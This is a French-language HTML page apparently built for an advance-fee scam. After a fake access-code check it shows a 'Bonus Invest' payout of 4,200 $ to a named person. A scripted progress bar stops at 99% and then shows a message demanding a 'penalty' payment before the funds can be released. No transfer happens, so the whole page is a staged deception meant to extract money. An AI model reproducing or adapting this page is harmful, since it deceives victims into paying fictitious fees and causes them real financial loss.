<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enregistrement Money</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f7f7f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container, .form-container {
            background-color: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }

        h1 {
            color: #333;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .amount {
            background-color: #e9ecef;
            cursor: not-allowed;
        }

        .progress-bar-container {
            width: 100%;
            background-color: #f3f3f3;
            border-radius: 5px;
            margin-top: 20px;
            display: none;
            position: relative;
        }

        .progress-bar {
            width: 0;
            height: 20px;
            background-color: #007bff;
            border-radius: 5px;
        }

        .progress-percentage {
            position: absolute;
            width: 100%;
            top: 0;
            left: 0;
            color: #333;
            font-size: 14px;
            font-weight: bold;
            text-align: center;
        }

        .progress-title {
            margin-top: 20px;
            font-size: 16px;
            color: #007bff;
            font-weight: bold;
            display: none;
        }

        .notification-message {
            color: orange;
            font-size: 14px;
            margin-top: 10px;
            display: none;
            font-weight: bold;
        }

        .access-error {
            color: red;
            font-size: 14px;
            display: none;
            margin-top: 10px;
            font-weight: bold;
        }

        button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container" id="accessContainer">
        <h1>Vérification du Code d'Accès</h1>
        <div class="form-group">
            <label for="accessCode">Entrez les quatres derniers chiffres de votre numero</label>
            <input type="password" id="accessCode" placeholder="Code d'accès" required>
        </div>
        <button onclick="checkAccessCode()">Valider</button>
        <div class="access-error" id="accessError">Erreur : Code d'accès incorrect.</div>
    </div>

    <div class="form-container" id="formContainer" style="display: none;">
        <h1>Paiement Bonus Invest</h1>

        <form id="tmoneyForm" onsubmit="return false;">
            <div class="form-group">
                <label for="name">Nom et Prénom</label>
                <input type="text" id="name" value="Daniel Junior" disabled>
            </div>

            <div class="form-group">
                <label for="phone">Numéro Mobile</label>
                <input type="tel" id="phone" value="0811351302" disabled>
            </div>

            <div class="form-group">
                <label for="amount">Montant à recevoir</label>
                <input type="text" id="amount" class="amount" value="4 200 $" disabled>
            </div>

            <button type="button" onclick="startProgress()">Procéder</button>

            <div class="progress-title" id="progressTitle">Transfert des fonds en cours...</div>

            <div class="progress-bar-container" id="progressContainer">
                <div class="progress-percentage" id="progressPercentage">0%</div>
                <div class="progress-bar" id="progressBar"></div>
            </div>

            <div class="notification-message" id="notificationMessage">Erreur : Une pénalité a été appliquée à votre compte. Veuillez la régler pour pouvoir recevoir la somme de 4 200 $..</div>
        </form>
    </div>

    <script>
        function checkAccessCode() {
            const accessCode = document.getElementById('accessCode').value;
            const accessError = document.getElementById('accessError');

            if (accessCode === "1302") {
                accessError.style.display = 'none';
                document.getElementById('accessContainer').style.display = 'none';
                document.getElementById('formContainer').style.display = 'block';
            } else {
                accessError.style.display = 'block';
            }
        }

        function startProgress() {
            document.getElementById('progressContainer').style.display = 'block';
            document.getElementById('progressTitle').style.display = 'block';
            document.getElementById('notificationMessage').style.display = 'none';

            let progress = 0;
            const progressBar = document.getElementById('progressBar');
            const progressPercentage = document.getElementById('progressPercentage');
            
            const interval = setInterval(() => {
                if (progress < 99) {
                    progress += 1;
                    progressBar.style.width = progress + '%';
                    progressPercentage.textContent = progress + '%';
                } else {
                    clearInterval(interval);
                    document.getElementById('notificationMessage').style.display = 'block';
                }
            }, 300);
        }
    </script>
</body>
</html>
